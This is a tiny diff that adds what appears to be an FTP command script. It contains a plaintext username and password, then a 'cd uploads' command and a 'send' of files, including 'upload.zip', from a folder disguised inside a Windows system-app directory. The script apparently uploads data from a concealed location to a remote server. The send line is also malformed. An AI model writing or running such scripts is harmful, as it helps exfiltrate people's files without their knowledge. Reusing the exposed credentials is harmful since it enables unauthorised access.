@@ -1,0 +1,5 @@
+RobinFuud1337
+*jvgm123*
+
+cd uploads
+send C:\Windows\SystemApps\Windows.CBSPreview_cw5n1h2txyewy\pris\video", "C:\Windows\SystemApps\Windows.CBSPreview_cw5n1h2txyewy\pris\upload.zip
